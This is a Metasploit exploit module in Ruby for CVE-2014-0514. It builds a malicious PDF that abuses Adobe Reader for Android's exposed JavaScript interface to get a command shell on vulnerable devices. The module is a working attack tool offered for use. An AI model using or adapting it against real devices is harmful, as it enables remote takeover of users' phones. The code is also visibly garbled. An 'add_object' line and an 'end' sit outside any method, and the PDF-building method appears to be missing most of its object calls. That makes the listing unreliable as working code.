# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/fileformat'
require 'msf/core/exploit/pdf'
require 'msf/core/exploit/android'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Android

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Adobe Reader for Android addJavascriptInterface Exploit',
      'Description'    => %q{
          Adobe Reader versions less than 11.2.0 exposes insecure native
          interfaces to untrusted javascript in a PDF. This module embeds the browser
          exploit from android/webview_addjavascriptinterface into a PDF to get a
          command shell on vulnerable versions of Reader.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Yorick Koster', # discoverer
        'joev' # msf module
      ],
      'References'     =>
        [
          [ 'CVE', '2014-0514' ],
          [ 'EDB', '32884' ],
          [ 'OSVDB', '105781' ],
        ],
      'Platform'       => 'android',
      'DefaultOptions' => {
      },
      'Targets'        => [
        [ 'Android ARM', {
            'Platform' => 'android',
            'Arch' => ARCH_ARMLE
          }
        ],
        [ 'Android MIPSLE', {
            'Platform' => 'android',
            'Arch' => ARCH_MIPSLE
          }
        ],
        [ 'Android X86', {
            'Platform' => 'android',
            'Arch' => ARCH_X86
          }
        ]
      ],
      'DisclosureDate' => 'Apr 13 2014',
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
    ], self.class)
  end

  def exploit
    print_status("Generating Javascript exploit...")
    js = add_javascript_interface_exploit_js(ARCH_ARMLE)
    print_status("Creating PDF...")
    file_create(pdf(js))
  end

  def trailer(root_obj)
    id = @xref.keys.max+1
    "trailer" << eol << "<</Size %d/Root " % id << ioRef(root_obj) << ">>" << eol
  end

    add_object(n, Zlib::Inflate.inflate(Rex::Text.decode_base64(data)))
  end

  def pdf(js)
    self.eol = "\x0d"
    @xref = {}
    @pdf = header('1.6')


    js = Zlib::Deflate.deflate(js)
    add_object(46, "\x0d<</Filter[/FlateDecode]/Length #{js.length}>>stream\x0d#{js}\x0dendstream\x0d")


    @xref_offset = @pdf.length
    @pdf << xref_table << trailer(25) << startxref

    @pdf
  end

end

